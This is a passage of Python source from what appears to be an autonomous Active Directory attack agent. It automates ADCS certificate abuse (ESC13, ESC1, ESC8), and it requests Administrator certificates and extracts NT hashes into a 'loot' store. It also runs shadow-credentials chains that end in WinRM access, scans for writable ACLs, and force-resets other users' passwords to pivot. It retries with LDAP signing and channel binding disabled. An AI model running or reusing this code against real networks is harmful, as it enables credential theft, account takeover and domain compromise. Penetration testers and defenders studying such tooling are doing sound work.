            SESSION.setdefault("agent_intel", {})["last_adcs_auth_error"] = "invalid_credentials"
            save_session()
            return (
                "ADCS scan failed: Kerberos/LDAP rejected the credential.\n"
                "Windows LDAP error data 52e means invalid username or password, not a AdAgent runtime error.\n"
                f"Account tested: {username}@{domain}\n"
                "Update the session password/hash or request a fresh TGT with the correct credential.\n\n"
                f"=== ADCS SCAN ===\n{scan_out[:1800]}"
            )
        results.append(
            "ADCS Kerberos LDAP bind failed; validating ccache/principal and retrying with strict target IP/DNS controls."
        )
        if password:
            new_ccache = _getTGT(username, password, domain, dc_ip)
            if new_ccache and _ccache_is_valid(new_ccache, username, domain):
                SESSION["use_kerberos"] = True
                SESSION["krb5_ccache"] = new_ccache
                os.environ["KRB5CCNAME"] = new_ccache
                ccache = new_ccache
                krb = True
                krb5_conf = _target_krb5_config(dc_ip, domain, dc_fqdn)
                _prefetch_ldap_tgs(domain, dc_ip, dc_fqdn)
                auth = f"-u '{username}@{domain}' -k -no-pass"
                env_prefix = f"KRB5_CONFIG={shell_quote(krb5_conf)} KRB5CCNAME={shell_quote(ccache)} "
        if krb and ccache:
            # Retry 1: LDAPS with channel binding DISABLED — fixes data 576
            # (SEC_E_UNSUPPORTED_FUNCTION / EPA mismatch on port 636)
            retry1_cmd = (
                f"{env_prefix}{_faketime_prefix()}{certipy_cmd} find {auth} {target_flags} "
                "-no-ldap-channel-binding -vulnerable -stdout 2>&1"
            )
            retry1_out = _run(retry1_cmd, timeout=90)
            if _certipy_success(retry1_out):
                # channel-binding-free LDAPS succeeded — use this output
                scan_out = retry1_out
            else:
                # Retry 2: plain LDAP/389 without signing as last resort
                retry2_cmd = (
                    f"{env_prefix}{_faketime_prefix()}{certipy_cmd} find {auth} {target_flags} "
                    "-ldap-scheme ldap -no-ldap-signing -vulnerable -stdout 2>&1"
                )
                retry2_out = _run(retry2_cmd, timeout=90)
                scan_out = (scan_out[:1200]
                            + "\n\n=== RETRY no-channel-binding (LDAPS/636) ===\n" + retry1_out[:1200]
                            + "\n\n=== RETRY LDAP/389 no-signing ===\n" + retry2_out)
        elif password and not (SESSION.get("ntlm_disabled") or SESSION.get("agent_intel", {}).get("ntlm_disabled")):
            retry_auth = f"-u '{username}@{domain}' -p '{password}'"
            retry_cmd = (
                f"PYTHONWARNINGS=ignore {_faketime_prefix()}{certipy_cmd} find {retry_auth} {target_flags} "
                "-no-ldap-channel-binding -vulnerable -stdout 2>&1"
            )
            retry_out = _run(retry_cmd, timeout=90)
            if _certipy_auth_rejected(retry_out):
                scan_out = scan_out[:1200] + "\n\n=== RETRY Password no-channel-binding ===\n" + retry_out[:1200]
            elif not _certipy_success(retry_out):
                retry_cmd2 = (
                    f"PYTHONWARNINGS=ignore {_faketime_prefix()}{certipy_cmd} find {retry_auth} {target_flags} "
                    "-ldap-scheme ldap -no-ldap-signing -vulnerable -stdout 2>&1"
                )
                retry_out2 = _run(retry_cmd2, timeout=90)
                retry_out = retry_out[:800] + "\n\n=== RETRY LDAP/389 ===\n" + retry_out2
            scan_out = scan_out[:1200] + "\n\n=== RETRY Password no-channel-binding ===\n" + retry_out

    results.append(f"=== ADCS SCAN ===\n{scan_out[:3000]}")

    # If ESC found but no Kerberos ticket, get TGT first then re-scan.
    if "ESC" in scan_out and not SESSION.get("use_kerberos") and not SESSION.get("krb5_ccache"):
        SESSION.setdefault("agent_intel", {})["last_adcs_needs_retry_after_tgt"] = True
        save_session()
        results.append("ESC vulnerability found but no Kerberos ticket — requesting TGT now...")
        tgt_res = tool_request_tgt(dc_ip, domain, username,
                                   password=SESSION.get("password", ""),
                                   nt_hash=SESSION.get("nt_hash", ""))
        results.append(f"TGT result: {tgt_res[:200]}")
        if SESSION.get("use_kerberos") and SESSION.get("krb5_ccache"):
            ccache = SESSION["krb5_ccache"]
            auth = f"-u '{username}@{domain}' -k -no-pass"
            os.environ["KRB5CCNAME"] = ccache
            krb5_conf = _target_krb5_config(dc_ip, domain, dc_fqdn)
            env_prefix = f"KRB5_CONFIG={shell_quote(krb5_conf)} KRB5CCNAME={shell_quote(ccache)} "

    def _pick_template_ca_for_esc(text: str, esc: str) -> tuple[str, str]:
        esc_re = re.compile(rf"ESC{re.escape(str(esc))}\b", re.I)
        best = ("", "")
        for m in esc_re.finditer(text or ""):
            start = max(0, m.start() - 1200)
            ctx = text[start:m.end() + 1200]
            rel_pos = m.start() - start
            tpl_matches = list(re.finditer(r"Template Name\s*:\s*(\S+)", ctx, re.I))
            ca_matches = list(re.finditer(r"CA Name\s*:\s*(\S+)", ctx, re.I))
            if tpl_matches and ca_matches:
                tpl = min(tpl_matches, key=lambda tm: abs(tm.start() - rel_pos)).group(1)
                ca = min(ca_matches, key=lambda cm: abs(cm.start() - rel_pos)).group(1)
                return tpl, ca
            if tpl_matches:
                best = (tpl_matches[-1].group(1), best[1])
            if ca_matches:
                best = (best[0], ca_matches[-1].group(1))
        if best[0] and best[1]:
            return best
        tpl_m = re.search(r"Template Name\s*:\s*(\S+)", text or "", re.I)
        ca_m = re.search(r"CA Name\s*:\s*(\S+)", text or "", re.I)
        return (tpl_m.group(1) if tpl_m else "", ca_m.group(1) if ca_m else "")

    if auto_exploit and "ESC" in scan_out:
        def _certipy_req_auth(tpl, ca, upn, pfx_name):
            upn_flag = f"-upn '{upn}' " if upn else ""
            req_out = _run(
                f"{env_prefix}{_faketime_prefix()}{certipy_cmd} req {auth} {target_flags} "
                f"-ca '{ca}' -template '{tpl}' {upn_flag}2>&1",
                timeout=60,
            )
            results.append(f"=== certipy req ({tpl}) ===\n{req_out[:1000]}")
            pfx = f"{pfx_name}.pfx"
            if not Path(pfx).exists():
                pfx = f"{(upn.split('@')[0] if upn else pfx_name)}.pfx"
            if Path(pfx).exists() or "Saved certificate" in req_out:
                import subprocess as _sp2
                auth_cmd = (
                    f"echo y | {env_prefix}{_faketime_prefix()}{certipy_cmd} auth -pfx '{pfx}' "
                    f"-dc-ip {dc_ip} -domain {domain} -username '{pfx_name}' 2>&1"
                )
                _record_agent_command(auth_cmd)
                auth_proc = _sp2.run(auth_cmd, shell=True, capture_output=True, text=True, timeout=30)
                auth_out = auth_proc.stdout + auth_proc.stderr
                results.append(f"=== certipy auth ===\n{auth_out[:1000]}")
                new_cc = f"{pfx_name}.ccache"
                if Path(new_cc).exists():
                    # certipy writes the ccache as a RELATIVE filename in the CWD.
                    # Left there it flickers: the next certipy round overwrites it and
                    # other flows unlink "<user>.ccache", so KRB5CCNAME ends up pointing
                    # at a file that vanishes mid-use (klist -> "No credentials cache").
                    # Persist it to an ABSOLUTE path in the agent runtime dir (same
                    # convention as the session ccache) under a distinct *_adcs name so a
                    # later request_tgt cannot clobber this privileged (PAC-injected, e.g.
                    # ESC13) ticket. Target-agnostic — only uses pfx_name/domain variables.
                    try:
                        stable = str(_runtime_path(f"{pfx_name}_{domain}_adcs.ccache"))
                        shutil.move(new_cc, stable)
                        new_cc = stable
                    except Exception:
                        new_cc = str(Path(new_cc).resolve())
                    os.environ["KRB5CCNAME"] = new_cc
                    SESSION["krb5_ccache"] = new_cc
                    SESSION["use_kerberos"] = True
                    SESSION.setdefault("agent_intel", {}).setdefault("ccaches", []).append(new_cc)
                    # Post-auth verifier: only treat this as a usable privileged shell
                    # when the freshly minted ADCS ccache actually validates (klist
                    # parses it + default principal matches). Store it under a stable
                    # key (adcs_ccache) that request_tgt won't clobber, so evil_winrm
                    # uses THIS PAC-injected ticket — not a later plain user TGT.
                    if _ccache_is_valid(new_cc, pfx_name, domain):
                        SESSION.setdefault("agent_intel", {})["adcs_shell_ready"] = True
                        SESSION.setdefault("agent_intel", {})["adcs_ccache"] = new_cc
                        save_session()
                        results.append(f"KRB5CCNAME updated -> {new_cc}")
                        results.append(
                            "NEXT ACTION: call evil_winrm now with Kerberos ccache.\n"
                            f"Correct command: evil-winrm -i {dc_fqdn} -r {domain.upper()} -K {new_cc}"
                        )
                    else:
                        save_session()
                        results.append(
                            f"certipy auth ran but the ADCS ccache did not validate "
                            f"({new_cc}); NOT flagging shell-ready. Manual verify: "
                            f"KRB5_CONFIG=<krb5.conf> KRB5CCNAME={new_cc} klist, then "
                            f"re-run certipy auth -pfx '{pfx}' -dc-ip {dc_ip} -domain {domain}."
                        )
                return auth_out
            return req_out

        if "ESC13" in scan_out:
            tpl, ca = _pick_template_ca_for_esc(scan_out, "13")
            if tpl and ca:
                results.append(
                    f"ESC13 selected: requesting current-user certificate from template {tpl} "
                    "without alternate UPN, then authenticating the PFX to refresh the ccache."
                )
                prev_ccache = SESSION.get("krb5_ccache")
                auth_out = _certipy_req_auth(tpl, ca, "", username)
                nt = re.search(r"[a-f0-9]{32}:([a-f0-9]{32})", auth_out)
                # ESC13's privilege lives in the Kerberos TGT's PAC (the OID-linked
                # group SID), NOT in the NT hash — certipy/UnPAC just returns the
                # user's own hash, which carries no added rights. So ESC13 counts
                # as a usable shell ONLY when certipy auth wrote a FRESH privileged
                # ccache this attempt. A pre-existing session ccache (initial
                # request_tgt) or a bare NT hash must not flag shell-ready,
                # otherwise we fire a doomed WinRM and report a false "TGT
                # obtained". Target-agnostic: keys only off a newly-minted ccache.
                fresh_ccache = (SESSION.get("krb5_ccache")
                                if SESSION.get("krb5_ccache") != prev_ccache else None)
                # A fresh ccache alone isn't enough — verify it actually validates
                # (klist + principal) before claiming a usable privileged shell.
                exploited = bool(fresh_ccache) and _ccache_is_valid(fresh_ccache, username, domain)
                if nt:
                    SESSION.setdefault("loot", {})[username] = nt.group(1)
                    SESSION.setdefault("agent_intel", {}).setdefault("nt_hashes", {})[username] = nt.group(1)
                    SESSION["nt_hash"] = nt.group(1)
                if exploited:
                    add_finding("ADCS ESC13 - Group Membership via OID", "Critical",
                                f"Template {tpl} maps cert to privileged group; privileged TGT obtained",
                                "Remove msDS-OIDToGroupLink on sensitive templates",
                                proof_level="exploited")
                    SESSION.setdefault("agent_intel", {})["adcs_shell_ready"] = True
                    SESSION.setdefault("agent_intel", {})["adcs_ccache"] = fresh_ccache
                    save_session()
                    results.append(
                        f"ESC13 exploited via template {tpl}. "
                        f"Next: evil_winrm using ccache {SESSION.get('krb5_ccache')} "
                        f"against FQDN {dc_fqdn}, realm {domain.upper()}."
                    )
                else:
                    # Template is misconfigured (OID->group link) so it is still a
                    # real finding, but auth did not yield a usable privileged ccache
                    # in this run — report honestly and do NOT claim shell-ready.
                    add_finding("ADCS ESC13 - Group Membership via OID", "High",
                                f"Template {tpl} links a certificate to a privileged group via "
                                f"msDS-OIDToGroupLink, but certificate auth did not produce a usable "
                                f"privileged ccache in this run — verify manually with certipy auth.",
                                "Remove msDS-OIDToGroupLink on sensitive templates")
                    results.append(
                        f"ESC13 template {tpl} found, but certificate auth did not produce a fresh "
                        f"privileged ccache (an NT hash alone does not carry the ESC13 group SID). "
                        f"Not flagging shell-ready."
                    )

        if re.search(r"ESC1\b", scan_out):
            tpl, ca = _pick_template_ca_for_esc(scan_out, "1")
            if tpl and ca:
                auth_out = _certipy_req_auth(tpl, ca, f"administrator@{domain}", "administrator")
                nt = re.search(r"[a-f0-9]{32}:([a-f0-9]{32})", auth_out)
                if nt:
                    add_finding("ADCS ESC1 - Admin NT Hash", "Critical",
                                f"ESC1 exploited; Administrator NT hash: {nt.group(1)}",
                                "Disable ESC1 template; require CA approval")
                    SESSION["owned_users"].append(
                        {"user": "Administrator", "method": "ADCS ESC1",
                         "nt_hash": nt.group(1), "time": datetime.now().isoformat()})

        if "ESC8" in scan_out:
            results.append("ESC8: HTTP enrollment endpoint open -> relay NTLM/Kerberos auth")
            add_finding("ADCS ESC8", "Critical",
                        "NTLM relay to ADCS HTTP enrollment possible",
                        "Enable EPA; require HTTPS for CA enrollment")

    return "\n\n".join(results)


def _find_gw_targets(found_user: str, found_pw: str, domain: str, dc: str) -> list:
    """Find computer/gMSA objects where found_user has GenericWrite/GenericAll."""
    base_dn = "DC=" + domain.replace(".", ",DC=")
    sess_user = SESSION.get("username", found_user)
    sess_pw   = SESSION.get("password", found_pw)
    results   = []
    krb = _session_kerberos_usable(sess_user, domain)
    env = os.environ.copy()
    if krb:
        env["KRB5CCNAME"] = SESSION["krb5_ccache"]
        if SESSION.get("krb5_config"):
            env["KRB5_CONFIG"] = SESSION["krb5_config"]
        _prefetch_ldap_tgs(domain, dc, _dc_host_for_kerberos(domain, dc))

    ldap_uri = f"ldap://{_dc_host_for_kerberos(domain, dc) if krb else dc}"
    if krb:
        ldap_args = ["ldapsearch", "-Y", "GSSAPI", "-H", ldap_uri, "-b", base_dn,
                     "(|(objectClass=computer)(objectClass=msDS-GroupManagedServiceAccount))",
                     "sAMAccountName", "distinguishedName", "objectClass"]
    elif _real_secret(sess_pw):
        ldap_args = ["ldapsearch", "-x", "-H", ldap_uri,
                     "-D", f"{sess_user}@{domain}", "-w", sess_pw,
                     "-b", base_dn,
                     "(|(objectClass=computer)(objectClass=msDS-GroupManagedServiceAccount))",
                     "sAMAccountName", "distinguishedName", "objectClass"]
    else:
        return results
    try:
        lr = subprocess.run(ldap_args, capture_output=True, text=True, timeout=30, env=env)
        ldap_out = _strip_ansi((lr.stdout + lr.stderr).strip())
    except Exception:
        ldap_out = ""

    objects, cur = [], {}
    for line in ldap_out.splitlines():
        if line.startswith("dn:"):
            if cur: objects.append(cur)
            cur = {"dn": line[3:].strip()}
        elif line.lower().startswith("samaccountname:"):
            cur["sam"] = line.split(":",1)[1].strip()
        elif line.lower().startswith("objectclass:"):
            cur.setdefault("classes", []).append(line.split(":", 1)[1].strip())
    if cur: objects.append(cur)

    for obj in objects:
        sam = obj.get("sam", "")
        if sam.endswith("$"):
            gmsa_store = SESSION.setdefault("agent_intel", {}).setdefault("gmsa_candidates", [])
            if (sam not in gmsa_store
                    and any(c.lower() == "msds-groupmanagedserviceaccount"
                            for c in obj.get("classes", []))):
                gmsa_store.append(sam)

    dacledit_py = os.path.expanduser("~/.local/bin/dacledit.py")
    for obj in objects:
        dn, sam = obj.get("dn",""), obj.get("sam","?")
        if not dn or not Path(dacledit_py).exists():
            continue
        if krb:
            acl_args = [
                "/usr/bin/python3", dacledit_py, "-action", "read",
                "-target-dn", dn, "-principal", found_user,
                "-k", "-no-pass", "-dc-ip", dc,
                "-dc-host", _dc_host_for_kerberos(domain, dc),
                f"{domain}/{sess_user}",
            ]
        else:
            acl_args = [
                "/usr/bin/python3", dacledit_py, "-action", "read",
                "-target-dn", dn, "-principal", found_user,
                f"{domain}/{sess_user}:{sess_pw}", "-dc-ip", dc,
            ]
        try:
            ar = subprocess.run(acl_args, capture_output=True, text=True, timeout=25, env=env)
            acl_out = _strip_ansi((ar.stdout + ar.stderr).strip())
        except Exception:
            acl_out = ""
        if not acl_out:
            continue
        for window in re.split(r"\n\s*\n", acl_out):
            if found_user.lower() not in window.lower():
                continue
            if re.search(r"GenericAll|FullControl|GenericWrite|WritePropert|WriteDacl|WriteOwner", window, re.I):
                if re.search(r"GenericAll|FullControl", window, re.I):
                    right = "GenericAll"
                elif re.search(r"WriteDacl", window, re.I):
                    right = "WriteDACL"
                elif re.search(r"WriteOwner", window, re.I):
                    right = "WriteOwner"
                else:
                    right = "GenericWrite"
                if not (sam.endswith("$") or _valid_ad_target(sam)):
                    continue
                entry = {"target_sam": sam, "target_dn": dn, "right": right}
                if entry not in results:
                    results.append(entry)
                    success(f"{right} on {sam} <- {found_user}")
    return results


def _winrm_test(target_sam: str, nt_hash: str, domain: str, dc: str) -> bool:
    out = _nxc(f"winrm {dc} -u '{target_sam}' -H '{nt_hash}' -d {domain}", timeout=15)
    return "Pwn3d" in out or "(Pwn3d!)" in out


def _dc_time_local() -> str:
    """Return DC time as local-timezone string for faketime."""
    import datetime
    try:
        raw = _run(f"curl -s --max-time 5 -I http://{SESSION.get('dc_ip','')}", timeout=8)
        for line in raw.splitlines():
            if line.lower().startswith("date:"):
                from email.utils import parsedate_to_datetime
                dt = parsedate_to_datetime(line[5:].strip())
                dc_utc = datetime.datetime.strptime(dt.strftime("%Y-%m-%d %H:%M:%S"), "%Y-%m-%d %H:%M:%S")
                delta = dc_utc - datetime.datetime.utcnow()
                fake = datetime.datetime.now() + delta + datetime.timedelta(seconds=5)
                return fake.strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        pass
    return ""


def _shadow_chain(attacker_user: str, attacker_pw: str, target_sam: str,
                  domain: str, dc: str) -> tuple:
    """Inline shadow credentials chain. Returns (result_dict, reason_str)."""
    # Resolve getTGT.py from multiple locations (same as _getTGT)
    _tgt_candidates = [
        os.path.expanduser("~/.local/bin/getTGT.py"),
        "/usr/share/doc/python3-impacket/examples/getTGT.py",
        shutil.which("getTGT.py") or "",
        str(Path(__file__).resolve().parents[2] / "tools" / "bin" / "getTGT.py"),
    ]
    tgt_py = next((p for p in _tgt_candidates if p and Path(p).exists()), "")
    if not tgt_py:
        return None, "getTGT.py not found — install impacket"
    fake_ts = _dc_time_local()
    if not fake_ts or not shutil.which("faketime"):
        return None, "faketime not found or DC time unavailable — install faketime"

    pfx_name = target_sam.rstrip("$").lower()
    pfx_path = f"/tmp/agent_{pfx_name}.pfx"
    atk_ccache = f"/tmp/{attacker_user}_{int(time.time())}.ccache"

    # Get TGT
    tgt_r = subprocess.run(
        ["faketime", fake_ts, "/usr/bin/python3", tgt_py,
         f"{domain}/{attacker_user}:{attacker_pw}", "-dc-ip", dc],
        capture_output=True, text=True, timeout=25)
    tgt_out = tgt_r.stdout + tgt_r.stderr
    if "Saving ticket" not in tgt_out:
        return None, f"TGT failed for {attacker_user}: {tgt_out.strip()[-300:]}"
    default = f"{attacker_user}.ccache"
    if Path(default).exists():
        shutil.move(default, atk_ccache)

    # Shadow add
    dc_fqdn = SESSION.get("dc_fqdn") or dc
    import datetime
    raw2 = _run(f"curl -s --max-time 5 -I http://{dc}", timeout=8)
    fake2 = fake_ts
    for ln in raw2.splitlines():
        if ln.lower().startswith("date:"):
            try:
                from email.utils import parsedate_to_datetime
                dt2 = parsedate_to_datetime(ln[5:].strip())
                dc_dt2 = datetime.datetime.strptime(dt2.strftime("%Y-%m-%d %H:%M:%S"), "%Y-%m-%d %H:%M:%S")
                delta2 = dc_dt2 - datetime.datetime.utcnow()
                fake2 = (datetime.datetime.now() + delta2 + datetime.timedelta(seconds=5)).strftime("%Y-%m-%d %H:%M:%S")
            except Exception:
                pass

    env = {**os.environ, "KRB5CCNAME": atk_ccache}
    certipy = _bin("certipy")
    if not certipy:
        return None, "certipy not found — install: pip install certipy-ad"

    sh_r = subprocess.run(
        ["faketime", fake2, certipy, "shadow", "add",
         "-u", f"{attacker_user}@{domain}", "-k",
         "-dc-ip", dc, "-dc-host", dc_fqdn, "-target", dc_fqdn, "-account", target_sam],
        capture_output=True, text=True, timeout=45, env=env)
    sh_out = sh_r.stdout + sh_r.stderr
    if "Successfully added Key Credential" not in sh_out:
        return None, f"certipy shadow add failed: {sh_out.strip()[-400:]}"

    if Path(f"{pfx_name}.pfx").exists():
        shutil.move(f"{pfx_name}.pfx", pfx_path)

    # PKINIT auth
    raw3 = _run(f"curl -s --max-time 5 -I http://{dc}", timeout=8)
    fake3 = fake2
    for ln in raw3.splitlines():
        if ln.lower().startswith("date:"):
            try:
                from email.utils import parsedate_to_datetime
                dt3 = parsedate_to_datetime(ln[5:].strip())
                dc_dt3 = datetime.datetime.strptime(dt3.strftime("%Y-%m-%d %H:%M:%S"), "%Y-%m-%d %H:%M:%S")
                delta3 = dc_dt3 - datetime.datetime.utcnow()
                fake3 = (datetime.datetime.now() + delta3 + datetime.timedelta(seconds=5)).strftime("%Y-%m-%d %H:%M:%S")
            except Exception:
                pass

    for stale in [f"{pfx_name}.ccache"]:
        Path(stale).unlink(missing_ok=True)

    auth_r = subprocess.run(
        ["faketime", fake3, certipy, "auth",
         "-pfx", pfx_path, "-dc-ip", dc, "-domain", domain, "-username", target_sam],
        capture_output=True, text=True, timeout=30, input="y\n")
    auth_out = auth_r.stdout + auth_r.stderr

    nt_m = re.search(r"[a-f0-9]{32}:([a-f0-9]{32})", auth_out, re.I)
    if not nt_m:
        return None, f"certipy auth (PKINIT) failed: {auth_out.strip()[-400:]}"
    nt = nt_m.group(1)

    cc = f"{pfx_name}.ccache"
    if Path(cc).exists():
        shutil.move(cc, f"/tmp/agent_{pfx_name}.ccache")

    return {"nt_hash": nt, "pfx_path": pfx_path}, "success"


def tool_shadow_credentials(attacker_user: str, attacker_pass: str,
                            target_account: str, dc_ip: str, domain: str) -> str:
    if not target_account or str(target_account).lower() in {"found", "target", "unknown", "all"}:
        return (
            "Shadow Credentials skipped: no valid target account was provided. "
            "Run acl_abuse_scan or query_bloodhound_paths first and use a concrete "
            "target such as USER, COMPUTER$, or gMSA$."
        )
    if _same_ad_account(target_account, attacker_user):
        return (
            f"Shadow Credentials skipped: target ('{target_account}') is the "
            f"attacking account itself. The victim must be a DIFFERENT object the "
            f"attacker has GenericWrite/GenericAll/WriteOwner over — self-targeting "
            f"is meaningless and fails with KDC_ERR_S_PRINCIPAL_UNKNOWN. Derive the "
            f"victim from acl_abuse_scan/query_bloodhound_paths first."
        )
    result, reason = _shadow_chain(attacker_user, attacker_pass, target_account, domain, dc_ip)
    if result:
        nt = result["nt_hash"]
        pwned = _winrm_test(target_account, nt, domain, dc_ip)
        SESSION.setdefault("loot", {})[target_account] = nt
        return (f"Shadow Credentials SUCCESS!\n"
                f"Account: {target_account}\nNT Hash: {nt}\n"
                f"WinRM: {'Pwn3d!' if pwned else 'not available'}\n"
                f"evil-winrm -i {dc_ip} -u '{target_account}' -H '{nt}'")
    return f"Shadow Credentials failed: {reason}"


def tool_acl_abuse_scan(dc_ip: str, domain: str, username: str,
                        password: str = "", target: str = "all") -> str:
    password = _real_secret(password)
    targets = _find_gw_targets(username, password, domain, dc_ip)
    if targets:
        out = f"ACL ABUSE OPPORTUNITIES ({len(targets)}):\n"
        acl_store = SESSION.setdefault("agent_intel", {}).setdefault("acl_paths", [])
        gmsa_store = SESSION.setdefault("agent_intel", {}).setdefault("gmsa_candidates", [])
        for t in targets:
            out += f"  {t['right']} on {t['target_sam']} ← {username}\n"
            item = (t["right"], t["target_sam"])
            if item not in acl_store:
                acl_store.append(item)
            if str(t["target_sam"]).endswith("$") and t["target_sam"] not in gmsa_store:
                gmsa_store.append(t["target_sam"])
        add_finding("ACL Abuse Path Found", "High",
                    f"User {username} has exploitable rights on AD objects",
                    "Audit and tighten AD ACLs; use tiered administration")
        return out

    results = []
    # Kerberos branch needs an LDAP TGS in the ccache or bloodyAD's own
    # getKerberosTGS() will throw IndexError before any LDAP traffic.
    if _session_kerberos_usable(username, domain):
        _prefetch_ldap_tgs(domain, dc_ip,
                           _dc_host_for_kerberos(domain, dc_ip))
    bloody_auth, env = _bloodyad_auth(domain, username, password, "", dc_ip)

    if bloody_auth:
        try:
            cmd = f"{_faketime_prefix()}{shell_quote(_bin('bloodyAD'))} {bloody_auth} get writable"
            r = subprocess.run(cmd, shell=True, capture_output=True, text=True,
                               timeout=45, env=env)
            writable_out = _strip_ansi((r.stdout + r.stderr).strip())
            if "Running specified command failed" in writable_out:
                cmd = f"{shell_quote(_bin('bloodyAD'))} {bloody_auth} get writable"
                r = subprocess.run(cmd, shell=True, capture_output=True, text=True,
                                   timeout=45, env=env)
                writable_out = _strip_ansi((r.stdout + r.stderr).strip())
        except Exception as e:
            writable_out = f"[ERROR] {e}"
        bloody_failed = any(x in writable_out.lower() for x in (
            "traceback", "[error]", "invalidcredentials", "could not", "failed",
        ))
        display_out = _compact_tool_failure(writable_out) if bloody_failed else writable_out[:2500]
        results.append("=== BLOODYAD GET WRITABLE ===\n" + display_out)
        writable_low = writable_out.lower()
        if writable_out and not bloody_failed:
            intel_store = SESSION.setdefault("agent_intel", {}).setdefault("acl_paths", [])
            for cn in re.findall(r'CN=([^,\r\n]+),[^:\r\n]*(?:DC=|OU=)', writable_out, re.I):
                item = ("GenericWrite", cn.strip())
                if _valid_ad_target(cn) and item not in intel_store:
                    intel_store.append(item)
            for sam in re.findall(r'(?:sAMAccountName|name|distinguishedName)\s*[:=]\s*([A-Za-z0-9_.\-$]+)', writable_out, re.I):
                item = ("GenericWrite", sam.strip())
                if _valid_ad_target(sam) and item not in intel_store:
                    intel_store.append(item)
            if any(x in writable_low for x in ("scriptpath", "write", "writable")):
                add_finding("Writable AD Objects", "High",
                            "bloodyAD get writable found modifiable AD objects; evaluate the matching abuse primitive",
                            "Remove unnecessary GenericWrite/WriteProperty from non-admin users")
        elif bloody_failed:
            results.append(
                "=== ACL FALLBACK STATUS ===\n"
                "bloodyAD get writable failed in this environment; continuing with "
                "ldapsearch/dacledit and BloodHound-compatible fallback checks."
            )
    else:
        results.append("=== BLOODYAD GET WRITABLE ===\nskipped: no usable bloodyAD auth material")

    if _real_secret(password):
        sysvol_cmd = (
            f"smbclient //{dc_ip}/SYSVOL "
            f"-U {shell_quote(domain + chr(92) + username + '%' + password)} "
            f"-c {shell_quote('cd ' + domain + '/scripts; ls')} 2>&1"
        )
        sysvol_out = _run(sysvol_cmd, timeout=20)
        results.append("=== SYSVOL SCRIPTS CHECK ===\n" + sysvol_out[:1200])
        if "NT_STATUS_ACCESS_DENIED" not in sysvol_out and "tree connect failed" not in sysvol_out.lower():
            SESSION.setdefault("agent_intel", {}).setdefault("script_path_edges", [])
            add_finding("SYSVOL Logon Script Path Reachable", "High",
                        f"{username} can browse SYSVOL scripts; combine writable user object with scriptPath",
                        "Restrict SYSVOL script write access and monitor scriptPath changes")

    # Broader check via dacledit on domain root. This is generic and often
    # survives bloodyAD-specific LDAP/client failures.
    dacledit_py = os.path.expanduser("~/.local/bin/dacledit.py")
    base_dn = "DC=" + domain.replace(".", ",DC=")
    if Path(dacledit_py).exists() and (password or _session_kerberos_usable(username, domain)):
        if _session_kerberos_usable(username, domain):
            env = os.environ.copy()
            env["KRB5CCNAME"] = SESSION["krb5_ccache"]
            args = ["/usr/bin/python3", dacledit_py, "-action", "read",
                    "-target-dn", base_dn, "-principal", username,
                    "-k", "-no-pass", "-dc-ip", dc_ip,
                    "-dc-host", _dc_host_for_kerberos(domain, dc_ip),
                    f"{domain}/{username}"]
            out = _list_run(args, timeout=30, env=env)
        else:
            args = ["/usr/bin/python3", dacledit_py, "-action", "read",
                    "-target-dn", base_dn, "-principal", username,
                    f"{domain}/{username}:{password}", "-dc-ip", dc_ip]
            out = _list_run(args, timeout=30)
        interesting = [l for l in out.splitlines()
                       if any(k in l for k in ["GenericAll","GenericWrite","WriteDACL",
                                                "WriteOwner","ForceChange","AllExtended",
                                                "WriteProperty"])]
        results.append("=== DACLEDIT DOMAIN ROOT ===\n" + ("\n".join(interesting[:40]) or "No interesting domain-root ACEs found.") + "\nFull output truncated.")
    else:
        results.append("=== DACLEDIT DOMAIN ROOT ===\nskipped: dacledit.py missing or no usable auth material.")
        interesting = []

    combined = "\n".join(results).lower()
    auth_restricted = any(s in combined for s in (
        "invalidcredentials", "sec_e_logon_denied", "nt_status_account_restriction",
        "status_user_session_deleted", "no usable auth material",
    ))
    no_acl_evidence = not targets and not interesting and not SESSION.get("agent_intel", {}).get("acl_paths")
    if auth_restricted and no_acl_evidence:
        dead = SESSION.setdefault("agent_intel", {}).setdefault("acl_scan_dead_for", [])
        if not any(_same_ad_account(username, d) for d in dead):
            dead.append(username)
        results.append(
            "=== ACL SCAN DEAD-PATH ===\n"
            "ACL scan produced only auth-restriction/fallback-empty results for this principal; "
            "future rounds should pivot credentials or use BloodHound data instead of repeating it."
        )
    return "\n\n".join(results)


def _generated_domain_password() -> str:
    alphabet = string.ascii_letters + string.digits
    body = "".join(secrets.choice(alphabet) for _ in range(14))
    return f"Aa1!{body}"


def tool_force_change_password_pivot(dc_ip: str, domain: str, username: str,
                                     target_user: str, password: str = "",
                                     nt_hash: str = "", new_password: str = "") -> str:
    """Reset a ForceChangePassword target and persist the resulting credential."""
    invalid = {"", "found", "target", "unknown", "all", "account", "user"}
    target = str(target_user or "").strip().strip("'\"")
    if target.lower() in invalid:
        return (
            "ForceChangePassword pivot skipped: no concrete target_user was provided. "
            "Run acl_abuse_scan or query_bloodhound_paths first."
        )

    new_pw = _real_secret(new_password) or _generated_domain_password()
    auth, env = _bloodyad_auth(domain, username, password, nt_hash, dc_ip)
    if not auth:
        return "ForceChangePassword pivot skipped: no usable bloodyAD auth material."

    cmd = (
        f"{shell_quote(_bin('bloodyAD'))} {auth} set password "
        f"{shell_quote(target)} {shell_quote(new_pw)}"
    )
    try:
        r = subprocess.run(f"{_faketime_prefix()}{cmd}", shell=True, capture_output=True, text=True,
                           timeout=30, env=env)
        out = _strip_ansi((r.stdout + r.stderr).strip())
    except Exception as e:
        out = f"[ERROR] {e}"

    failed = any(s in out.lower() for s in (
        "traceback", "invalidcredentials", "insufficient", "constraint",
        "unwilling", "error", "failed", "denied"
    ))
    if failed:
        return f"ForceChangePassword pivot failed for {target}:\n{out[:2000]}"

    cred = {"user": target, "password": new_pw, "auth": "ForceChangePassword"}
    SESSION.setdefault("agent_intel", {}).setdefault("valid_creds", [])
    if cred not in SESSION["agent_intel"]["valid_creds"]:
        SESSION["agent_intel"]["valid_creds"].append(cred)
    SESSION.setdefault("loot", {})[target] = new_pw
    add_finding("ForceChangePassword Admin Pivot", "Critical",
                f"Reset password for {target} using ForceChangePassword edge",
                "Remove delegated password-reset rights from admin-tier accounts; monitor 4724")
    test = _nxc(f"smb {dc_ip} -u '{target}' -p '{new_pw}' -d {domain}", timeout=20)
    return (
        f"ForceChangePassword pivot SUCCESS for {target}\n"
        f"New credential stored in session loot.\n"
        f"Validation:\n{test[:1500]}"
    )


def tool_logon_script_abuse(dc_ip: str, domain: str, username: str,
                            target_user: str, password: str = "",
                            nt_hash: str = "", script_name: str = "",
